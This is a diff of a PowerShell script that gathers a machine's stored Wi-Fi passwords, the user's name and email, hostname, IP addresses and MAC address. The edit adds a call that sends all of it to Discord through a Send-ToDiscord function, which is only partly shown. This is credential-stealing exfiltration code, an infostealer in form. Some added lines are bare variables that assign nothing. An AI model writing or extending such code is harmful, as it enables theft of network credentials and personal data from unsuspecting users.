@@ -376,20 +376,30 @@ function Send-ToDiscord {
     }
 }
 
-# Main Script: Gather Information
+# Main Script: Gather System Information
 $FullName = Get-FullName
 $Email = Get-Email
-#$GeoLocation = Get-GeoLocation
-$WiFiPasswords = Get-WifiPasswords
 $HostName = $env:COMPUTERNAME
+$WiFiPasswords = Get-WifiPasswords
+$computerPubIP
+$localIP
+$MAC
+$IsDHCPEnabled
+
 $SystemInfo = @"
 User: $FullName
 Email: $Email
 Hostname: $HostName
-GeoLocation: $GeoLocation
+Public IP: $computerPubIP
+Local IP(s): $localIP
+MAC Address: $MAC
+DHCP Enabled: $IsDHCPEnabled
 Wi-Fi Passwords:
 $WiFiPasswords
 "@
+
+Send-ToDiscord -Message $SystemInfo
+
 
 # Save Information to File
 $SystemInfo | Out-File -FilePath $OutputFilePath -Encoding UTF8
